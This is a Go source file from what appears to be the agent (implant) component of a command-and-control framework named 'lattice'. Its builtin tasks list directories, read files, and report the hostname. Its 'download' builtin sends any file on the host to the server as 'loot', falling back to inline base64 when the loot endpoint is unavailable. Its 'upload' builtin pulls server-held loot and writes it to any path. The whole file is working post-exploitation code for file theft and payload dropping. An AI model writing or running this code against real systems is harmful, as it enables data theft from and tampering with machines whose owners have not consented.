package runtime

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"mime"
	"os"
	"path/filepath"
	"strings"
	"time"

	agentv1 "github.com/digitizables/lattice/gen/lattice/agent/v1"
)

const (
	maxCatBytes      = 1 << 20 // 1 MiB
	maxInlineLootB64 = 512 << 10
)

func runBuiltinHostname() (int32, string, string) {
	h, err := os.Hostname()
	if err != nil {
		return 1, "", err.Error()
	}
	return 0, h, ""
}

func (a *Agent) resolvePath(arg string) string {
	a.ensureCwd()
	arg = strings.TrimSpace(arg)
	if arg == "" {
		return a.Cwd
	}
	if filepath.IsAbs(arg) {
		return filepath.Clean(arg)
	}
	return filepath.Clean(filepath.Join(a.Cwd, arg))
}

func (a *Agent) runBuiltinLS(args []string) (int32, string, string) {
	path := a.Cwd
	if len(args) > 0 && strings.TrimSpace(args[0]) != "" {
		path = a.resolvePath(strings.Join(args, " "))
	}
	entries, err := os.ReadDir(path)
	if err != nil {
		return 1, "", err.Error()
	}
	var b strings.Builder
	fmt.Fprintf(&b, "%s\n", path)
	for _, e := range entries {
		info, err := e.Info()
		if err != nil {
			fmt.Fprintf(&b, "???????? ? %s\n", e.Name())
			continue
		}
		mode := info.Mode().String()
		size := info.Size()
		name := e.Name()
		if e.IsDir() {
			name += string(os.PathSeparator)
		}
		fmt.Fprintf(&b, "%s %12d %s %s\n", mode, size, info.ModTime().Format(time.RFC3339), name)
	}
	return 0, b.String(), ""
}

func (a *Agent) runBuiltinCat(args []string) (int32, string, string) {
	if len(args) == 0 || strings.TrimSpace(args[0]) == "" {
		return 1, "", "usage: cat <path>"
	}
	path := a.resolvePath(strings.Join(args, " "))
	f, err := os.Open(path)
	if err != nil {
		return 1, "", err.Error()
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		return 1, "", err.Error()
	}
	if info.IsDir() {
		return 1, "", path + ": is a directory"
	}

	data, err := io.ReadAll(io.LimitReader(f, maxCatBytes+1))
	if err != nil {
		return 1, "", err.Error()
	}
	out := string(data)
	if len(data) > maxCatBytes {
		out = string(data[:maxCatBytes]) + "\n...[truncated: file exceeded 1MiB]"
	}
	return 0, out, ""
}

func (a *Agent) runBuiltinDownload(ctx context.Context, taskID string, args []string) (int32, string, string) {
	if len(args) == 0 || strings.TrimSpace(args[0]) == "" {
		return 1, "", "usage: download <path>"
	}
	if a.Transport == nil {
		return 1, "", "no transport"
	}
	path := a.resolvePath(strings.Join(args, " "))
	data, err := os.ReadFile(path)
	if err != nil {
		return 1, "", err.Error()
	}

	name := filepath.Base(path)
	ct := mime.TypeByExtension(filepath.Ext(name))
	if ct == "" {
		ct = "application/octet-stream"
	}

	dlCtx, cancel := context.WithTimeout(ctx, 5*time.Minute)
	defer cancel()
	resp, err := a.Transport.PostLootUpload(dlCtx, &agentv1.AgentLootUpload{
		AgentId:     a.ID,
		AgentToken:  a.Token,
		TaskId:      taskID,
		RemotePath:  path,
		Name:        name,
		Data:        data,
		ContentType: ct,
	})
	if err == nil && resp != nil && resp.GetAccepted() {
		msg := fmt.Sprintf("uploaded %s (%d bytes) loot_id=%s", path, len(data), resp.GetLootId())
		return 0, msg, ""
	}

	// Channel may not expose /v1/loot/upload yet — fall back for small files.
	if len(data) > maxInlineLootB64 {
		errMsg := "loot upload unavailable"
		if err != nil {
			errMsg = err.Error()
		}
		return 1, "", fmt.Sprintf("%s; file too large for inline base64 (%d bytes, limit %d). Need POST /v1/loot/upload",
			errMsg, len(data), maxInlineLootB64)
	}
	enc := base64.StdEncoding.EncodeToString(data)
	note := "LOOT_INLINE_BASE64"
	if err != nil {
		note += " (loot upload failed: " + err.Error() + ")"
	}
	out := fmt.Sprintf("%s name=%s path=%s size=%d\n%s\n", note, name, path, len(data), enc)
	return 0, out, "warning: returned inline base64; server loot endpoint missing or rejected upload"
}

func (a *Agent) runBuiltinUpload(ctx context.Context, args []string) (int32, string, string) {
	if len(args) < 2 {
		return 1, "", "usage: upload <loot_id> <dest_path>"
	}
	if a.Transport == nil {
		return 1, "", "no transport"
	}
	lootID := strings.TrimSpace(args[0])
	dest := a.resolvePath(strings.Join(args[1:], " "))
	if lootID == "" {
		return 1, "", "usage: upload <loot_id> <dest_path>"
	}

	dlCtx, cancel := context.WithTimeout(ctx, 5*time.Minute)
	defer cancel()
	resp, err := a.Transport.DownloadLoot(dlCtx, a.ID, lootID)
	if err != nil {
		return 1, "", "loot download failed (need POST /v1/loot/download): " + err.Error()
	}
	if resp == nil || !resp.GetFound() {
		return 1, "", "loot not found: " + lootID
	}
	data := resp.GetData()
	if err := os.MkdirAll(filepath.Dir(dest), 0o755); err != nil {
		return 1, "", err.Error()
	}
	if err := os.WriteFile(dest, data, 0o644); err != nil {
		return 1, "", err.Error()
	}
	name := resp.GetName()
	if name == "" {
		name = filepath.Base(dest)
	}
	return 0, fmt.Sprintf("wrote %s (%d bytes) from loot_id=%s name=%s", dest, len(data), lootID, name), ""
}
